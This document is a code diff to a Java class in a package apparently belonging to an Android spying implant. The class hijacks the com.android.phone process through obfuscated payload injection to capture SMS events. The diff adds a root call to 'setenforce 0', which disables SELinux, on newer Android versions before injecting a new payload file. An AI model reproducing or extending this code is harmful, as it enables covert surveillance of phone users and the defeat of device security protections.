@@ -5,6 +5,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.module.message.LowEventSms;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
 import com.android.dvci.util.Instrument;
 import com.android.dvci.util.LowEventMsg;
 import com.android.mm.M;
@@ -43,9 +44,15 @@ public class LowEventSmsManager extends Listener<LowEventSms> implements Observe
 	@Override
 	public void start() {
 		LowEventHandlerManager.self().attach(this);
+
 		if(hijack == null) {
-			hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
-			hijack.setInstrumentationSuccessDir( Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"),true);
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Execute.executeRoot(M.e("setenforce 0"));
+				hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("paL.data"), M.e("radio"));
+			}else {
+				hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
+			}
+				hijack.setInstrumentationSuccessDir( Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"),true);
 			hijack.addArg(Status.getApkName());
 		}
 		hijack.start();
